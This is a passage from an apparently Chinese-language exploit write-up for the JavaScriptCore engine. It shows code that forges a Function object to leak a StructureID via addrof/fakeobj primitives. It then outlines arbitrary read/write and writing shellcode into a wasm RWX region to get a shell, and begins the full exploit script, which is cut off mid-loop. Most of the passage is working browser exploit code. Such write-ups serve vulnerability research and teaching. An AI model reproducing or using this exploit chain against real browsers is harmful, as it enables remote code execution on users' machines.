伪造一个`Function`
对象，然后在获取函数名称的时候(`function->name(vm)`)会找`unlinked_function_executable.m_identifier`,
我们把它指向了`container+0x10` 也就是我们伪造的function object, 它会在`container.btfly`
上获取函数名对应的字符串， 把它指向一个`ArrayWithDouble` 对象我们就可以泄露出它的`StructureID` 啦
    var arr_leak = new Array(1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
    function leakid(){
        var unlinked_function_executable = {
            m_isBuitinFunction: i2f(0xdeadbeef),
            pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6,
            m_identifier: {},
        };
        var fake_function_executable = {
          pad0: 0, pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6, pad7: 7, pad8: 8,
          m_executable: unlinked_function_executable,
        };
        var container = {
          jscell: i2f(0x00001a0000000000),
          btfly: {},
          pad: 0,
          m_functionExecutable: fake_function_executable,
        };
        var fake_addr = addrof(container)+0x10;
        fake_o = fakeobj(fake_addr);
        unlinked_function_executable.m_identifier = fake_o; 
        container.btfly = arr_leak; 
        var name_str = Function.prototype.toString.call(fake_o);
        return name_str.charCodeAt(9); 
    }
###  任意地址读写 -> 写wasm getshell
有了可用的`StructureID` 之后，后面就是 搞任意地址读写，然后写 wasm 的 rwx 段getshell
。这一部分的利用代码基本上都差不多，这里不再赘述，具体参考后面完整的exp
## exp
    var conversion_buffer = new ArrayBuffer(8)
    var f64 = new Float64Array(conversion_buffer)
    var i32 = new Uint32Array(conversion_buffer)
    var BASE32 = 0x100000000
    function f2i(f) {
        f64[0] = f
        return i32[0] + BASE32 * i32[1]
    }
    function i2f(i) {
        i32[0] = i % BASE32
        i32[1] = i / BASE32
        return f64[0]
    }
    function hex(addr){
        return addr.toString(16);
    }
    let arrays = [];
    let regexp = new RegExp();
    let leakme = [{}];
    let jit_mode = 0;
    var global_arr = [1.1, 2.2];
    const MAX_ARRAYS = 100;
    for (let i = 0; i 